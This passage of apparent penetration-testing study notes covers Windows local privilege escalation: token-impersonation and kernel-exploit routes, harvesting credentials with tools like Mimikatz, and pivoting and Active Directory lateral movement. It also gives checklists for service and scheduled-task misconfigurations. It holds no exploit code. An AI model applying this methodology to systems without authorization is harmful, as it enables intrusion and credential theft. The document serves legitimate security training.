SeImpersonatePrivilege -> PrintSpoofer
Application/kernel exploit (when appropriate)
```

Goal: move from a user like `dave`/`steve` to a local administrator or `NT AUTHORITY\SYSTEM`.

## Credentials

Privilege escalation frequently exposes credentials in both directions:

- before escalation, credentials may be the escalation vector;
- after escalation, broader file access and SYSTEM/admin rights may expose additional user secrets, hashes, tokens, sessions, password-manager data, and configuration files.

The chapter specifically connects privileged access with the possibility of using tools such as Mimikatz later to extract credentials.

## Pivoting

Local network enumeration supports pivot decisions:

```text
ipconfig /all
route print
netstat -ano
```

New credentials and admin-level accounts may allow access to other systems via RDP/WinRM/SMB or reveal networks that are only reachable from the compromised Windows host.

## Active Directory

This chapter is about **local Windows privilege escalation**, not AD exploitation, but several concepts are foundational for AD:

- SIDs/RIDs
- access tokens
- group membership
- credential reuse
- privileged local/domain users
- WinRM/RDP remote access
- token impersonation

A local admin credential or reused password can become the bridge into later AD enumeration/lateral movement.

## Proof

Once you reach local Administrator/SYSTEM:

1. verify the effective context (`whoami`, groups/privileges as appropriate);
2. collect the required proof according to the lab/exam instructions;
3. document the exact escalation path and evidence;
4. avoid unnecessary destructive changes and restore modified service/task binaries when practical in a real engagement.

## Reminders beside the cheat sheet

- Re-enumerate every time you gain access as a **new user** or a **higher-integrity context**.
- A password found in one file/service should be tested against **appropriate** local accounts/services because reuse is common.
- Do not blindly trust winPEAS/PowerUp; manually verify important permissions and paths.
- For services, think in this order: **binary permissions -> DLL loading -> unquoted path -> restart/reboot ability -> service run-as account**.
- For Scheduled Tasks: **Run As User -> Trigger/Next Run -> Action -> ACL of action file/path**.
- Before kernel exploits, check **files, PowerShell artifacts, services, tasks, and token privileges**.
- Avoid disruptive reboot/kernel-exploit activity on real client systems unless explicitly permitted.
- After admin/SYSTEM, **re-enumerate** and continue toward Credentials, Pivoting, AD, and Proof.
